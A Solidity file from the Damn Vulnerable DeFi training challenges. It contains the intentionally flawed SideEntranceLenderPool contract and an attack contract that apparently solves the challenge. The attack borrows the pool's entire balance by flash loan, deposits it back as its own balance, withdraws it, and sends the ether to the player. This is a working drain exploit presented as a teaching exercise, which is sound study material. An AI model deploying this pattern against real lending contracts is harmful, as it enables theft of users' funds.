// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    mapping(address => uint256) private balances;

    error RepayFailed();

    event Deposit(address indexed who, uint256 amount);
    event Withdraw(address indexed who, uint256 amount);

    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];

        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);
        (bool isSuccess,) = msg.sender.call{ value: amount }("");
        require(isSuccess, "");
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{ value: amount }();

        if (address(this).balance < balanceBefore) {
            revert RepayFailed();
        }
    }
}

contract SideEntranceAttack {
    SideEntranceLenderPool immutable pool;
    address immutable player;

    constructor(address _pool, address _player) {
        pool = SideEntranceLenderPool(_pool);
        player = _player;
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        (bool isSuccess,) = player.call{ value: address(this).balance }("");
        require(isSuccess, "SideEntranceAttack attack");
    }

    function execute() external payable {
        require(msg.sender == address(pool), "msg.sender");
        pool.deposit{ value: msg.value }();
    }

    receive() external payable { }
}
